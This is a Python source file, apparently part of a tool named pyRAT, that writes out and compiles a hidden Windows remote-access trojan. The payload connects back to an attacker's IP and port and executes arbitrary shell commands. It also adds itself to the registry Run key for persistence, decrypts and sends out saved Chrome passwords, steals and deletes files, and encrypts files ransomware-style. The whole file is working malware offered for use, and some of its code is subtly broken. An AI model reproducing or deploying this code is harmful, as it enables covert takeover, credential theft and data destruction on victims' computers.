import sys
import time
import os
import subprocess
try:
    import PyInstaller
except ImportError:
    print("[!] Not found modules PyInstaller. Please install to executable payloads!!")
    time.sleep(2)
    sys.exit(0)


def executable_payloads(filename):
    try:
        file_real = filename.split(".")[0]
        file_spec = filename.split(".")[1]
        os.system("pyinstaller -F --noconsole {filename}".format(filename=filename))
        os.remove(filename)
        if filename.split(".")[1] == "spec":
            os.remove(file_real + "." + file_spec)
        print("\nFile created on folder '/dist/{}.exe'".format(filename.split(".py", 1)[0]))
        print("Completed generate payloads!!")
        time.sleep(3.5)
    except KeyboardInterrupt:
        print("Exiting ...!!")
        sys.exit(0)

def generator_payloads(ip_address, port_address, fileOutput):
    try:
        print("\nStarted generate payload file ....")
        time.sleep(2)
        payload_code = """#!/usr/bin/pyton
import os, sys, time, socket, sqlite3, platform, subprocess, random, zipfile
from Crypto.Cipher import AES
from Crypto.Hash import SHA256
if os.name == "nt":
    try:
        import _winreg
        import win32crypt
    except ImportError as Error:
        print("[!] " + Error)
        sys.exit()
else:
    print("[!] Exploit running for windows. Not support for linux!!")


class setClient:
    def __init__(self, ip_address, port_address):
        self.connected = False
        self.IP_ADDRESS = ip_address
        self.PORT_ADDRESS = int(port_address)
        self.payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

class ShellcodeExploit(setClient):
    def run_payload(self):
        persistence()
        os_system = {"windows" : platform.platform(), "linux" : platform.platform()}
        while True:
            try:
                # print("[*] Trying connection (%s:%s) ..." % (self.IP_ADDRESS, str(self.PORT_ADDRESS)))
                sys.stdout.flush()
                self.payload.connect((self.IP_ADDRESS, self.PORT_ADDRESS))
                if os.name == "nt":
		    persistence()
                    self.payload.send(os_system['windows'].encode('utf-8'))
                else:
                    self.payload.send(os_system['linux'].encode('utf-8'))
                self.payload.settimeout(None)
                self.connected = True
                # print("Connected with exploit!!")
            except socket.error:
                # print("[*] Failed to connect. retrying in 2 seconds ... ")
                time.sleep(2)
                self.run_payload()

            while True:
                try:
                    self.data = self.payload.recv(4096).decode()
                    if self.data[:2] == "cd":
                        try:
                            directory = self.data[3:]
                            os.chdir(directory)
                            self.payload.send("=> Current directory: {}".format(os.getcwd()).encode('utf-8'))
                        except os.error as _ERR:
                            self.payload.send(str(_ERR).encode('utf-8'))

                    if self.data == "dump_chrome":
                        database = os.getenv('LOCALAPPDATA') + '\Google\Chrome\User Data\Default\Login Data'
                        ChromeDump(database)
                        with open("saved_pass.txt", "r") as file_password:
                            fn = file_password.read()
                            self.payload.sendall(fn.encode('utf-8'))
                            file_password.close()
                        # os.remove("saved_pass.txt")

                    elif self.data.startswith("download") == True:
                        try:
                            filename = self.data.split()[1]
                            with open(filename, "rb") as downloadFiles:
                                file_data = downloadFiles.read(1024)
                                while file_data:
                                    self.payload.send(file_data.encode('utf-8'))
                                    file_data = downloadFiles.read(1024)
                                self.payload.send("[+] Completed downloaded.".encode('utf-8'))
                        except IndexError:
                            self.payload.send("Usage: download [filename]".encode('utf-8'))

                    elif self.data.startswith("makezip") == True:
                        try:
                            filename_target = self.data.split()[1]
                            if os.path.isdir(filename_target) == True:
                                self.created = zipfile.ZipFile(filename_target + ".zip", "w", zipfile.ZIP_DEFLATED)
                                rootlen = len(filename_target) + 1
                                for base, dirs, files in os.walk(filename_target):
                                    for file_target in files:
                                        filename = os.path.join(base, file_target)
                                        self.created.write(filename, filename[rootlen:])
                                        self.created.close()
                                self.payload.send("[+] Compressed folder successfully!!".encode('utf-8'))
                            elif os.path.isfile(filename_target) == True:
                                self.payload.send("This a file failed to complete compress -> {}".format(filename_target).encode('utf-8'))
                        except IndexError:
                            self.payload.send("Usage: makezip [source folder]".encode('utf-8'))

                    elif self.data.startswith("del") == True:
                        try:
                            filename_to_delete = self.data.split()[1]
                            if os.path.isfile(filename_to_delete) == True:
                                os.remove(filename_to_delete)
                                self.payload.send("[+] Deleted file -> {}".format(filename_to_delete).encode('utf-8'))
                            elif os.path.isdir(filename_to_delete) == True:
                                self.payload.send("[!] Failed to delete is folder -> {}".format(filename_to_delete).encode('utf-8'))
                            else:
                                self.payload.send("[!] Invalid filename!!".encode('utf-8'))
                        except IndexError:
                            self.payload.send("Usage: del [filename]".encode('utf-8'))

                    elif self.data.startswith("unzip") == True:
                        try:
                            filename_zip = self.data.split()[1]
                            if os.path.isfile(filename_zip) == True:
                                with zipfile.ZipFile(filename_zip, "r") as file_zip:
                                    file_zip.extractall()
                                    self.payload.send("[+] Completed unzip file -> {}".format(filename_zip).encode('utf-8'))
                            else:
                                self.payload.send("[!] Invalid filename!!".encode('utf-8'))
                        except IndexError:
                            self.payload.send("Usage: unzip [filename (.zip)]".encode('utf-8'))

                    elif self.data.startswith("encrypt") == True:
                        try:
                            fileEncrypt = self.data.split()[1]
                            keyPasswords = self.data.split()[2]
                            encrypt = Ransomware(keyPasswords, fileEncrypt)
                            encrypt.encryptFiles()
                        except IndexError:
                            self.payload.send("Usage: encrypt [file] [key]".encode('utf-8'))

                    elif self.data.startswith("decrypt") == True:
                        try:
                            fileDecrypt = self.data.split()[1]
                            keyPasswords = self.data.split()[2]
                            decrypt = Ransomware(keyPasswords, fileDecrypt)
                            decrypt.decryptFiles()
                        except IndexError:
                            self.payload.send("Usage: decrypt [file] [key]".encode('utf-8'))

                    elif self.data == "help":
                        self.payload.sendall(command_help().encode('utf-8'))

                    elif self.data == "info":
                        self.payload.send(get_info())

                    elif self.data == "quit":
                        self.payload.send("Close connection!! Bye :D".encode('utf-8'))
                        # self.payload.close()
                        self.run_payload()
                        # sys.exit()

                    elif self.data == None:
                        self.payload.send("No send commands!!".encode('utf-8'))

                    else:  
                        process = subprocess.Popen(self.data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        shell = process.stderr.read() + process.stdout.read()
                        self.payload.send(str(shell).encode('utf-8'))

                except KeyboardInterrupt:
                    self.payload.close()
                    run_again = ShellcodeExploit(self.IP_ADDRESS, self.PORT_ADDRESS)
                    run_again.run_payload()

def format_saved(url, user, passwrd):
	text = '''
	URL : %s
	USER : %s
	PASSWORD : %s
	------------------------
	''' % (url, user, passwrd)
	return text

def ChromeDump(database):
    try:
        if not os.path.isfile(database):
            print("The file doesnt exists!!")
            return
        conn = sqlite3.connect(database)
        cursor = conn.cursor()
        try:
            cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        except:
            print("Impossible to read " + database)
            return
        for query in cursor.fetchall():
            pwd = win32crypt.CryptUnprotectData(query[2], None, None, None, 0)[1]
            if pwd:
                url = query[0]
                user = query[1]
                pwds = pwd
                passwordFiles = open("saved_pass.txt", "a")
                passwordFiles.write(format_saved(url, user, pwds))
                passwordFiles.close()
    except IOError as CH_ERR:
        print(str(CH_ERR))


def persistence():
	run_key = 'Software\Microsoft\Windows\CurrentVersion\Run'
	bin_path = os.path.join(os.getcwd(), sys.argv[0])
	try:
		reg_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, run_key, 0, _winreg.KEY_WRITE)
		_winreg.SetValueEx(reg_key, "main", 0, _winreg.REG_SZ, bin_path)
	except WindowsError:
		print("Registry key failed!"); time.sleep(5)
		sys.exit()

def get_info():
    os_detection = platform.system()
    processor = platform.processor()
    architecture = platform.architecture()[0]
    pc_name = platform.node()
    info = '''
    Device Information
    ------------------
    PC Name : %s
    Operating System : %s
    Architecture : %s
    Processor : %s
    ''' % (pc_name, os_detection, architecture, processor)
    return info

class Ransomware:
    def __init__(self, key_password, filenames):
        self.KEY = key_password
        self.FILES = filenames

    def encryptFiles(self):
        try:
            chunksize = 64 * 1024
            outputFile = self.FILES + ".ENCRYPT"
            filesize = str(os.path.getsize(self.FILES)).zfill(16)
            IV = ''
            for i in range(16):
                IV += chr(random.randint(0, 0xFF))
            encryptor = AES.new(self.KEY, AES.MODE_CBC, IV)
            with open(self.FILES, "rb") as self.infile:
                with open(outputFile, "w") as self.outfile:
                    self.outfile.write(filesize)
                    self.outfile.close(IV)
                    while True:
                        chunk = self.infile.read(chunksize)
                        if len(chunk) == 0:
                            break
                        elif len(chunk) % 16 != 0:
                            chunk += ' ' * (16 - (len(chunk) % 16))
                        self.outfile.write(encryptor.encrypt(chunk))
            os.remove(self.FILES)
        except IOError as ERROR_IO:
            print(str("[!] " + ERROR_IO))
            sys.exit()

    def decryptFiles(self):
        try:
            chunksize = 64 * 1024
            outputFile = self.FILES[:-8]
            with open(self.FILES, "rb") as self.infiles:
                filesize = long(self.infiles.read(16))
                IV = self.infiles.read(16)
                decryptor = AES.new(self.KEY, AES.MODE_CBC, IV)
                with open(outputFile, "wb") as self.outfiles:
                    while True:
                        chunk = self.infiles.read(chunksize)
                        if len(chunk) == 0:
                            break
                        self.outfiles.write(decryptor.decrypt(chunk))
                    self.outfiles.truncate(filesize)
            os.remove(self.FILES)
        except IOError as IO_ERROR:
            print(str("[!] " + IO_ERROR))
            sys.exit()


def command_help():
    info = '''
    Help Info
    =========
    
    Command          Description
    -------          ----------
    cd               move on current directory target
    dump_chrome      dump username and password database chrome
    decrypt          unlock file using cryptolocker by pyRAT
    del              deleted file on target
    download         download file on target
    encrypt          lock file using cryptolocker by pyRAT
    info             get information device target
    makezip          make file zip on the target 
    upload           upload or send file to machine target
    unzip            extract file zip
    quit             close interaction
    '''
    return info


if __name__ == "__main__":
    try:
        shell = ShellcodeExploit('""" + ip_address + """', """ + str(port_address) + """)
        shell.run_payload()
    except KeyboardInterrupt:
        shell.run_payload()
"""
        with open(fileOutput, "w") as sourceFile:
            sourceFile.write(payload_code)
            sourceFile.close()
            executable_payloads(fileOutput)
    except KeyboardInterrupt:
        print("\n[!] Interrupt user. Exiting ...!!")
        sys.exit(0)
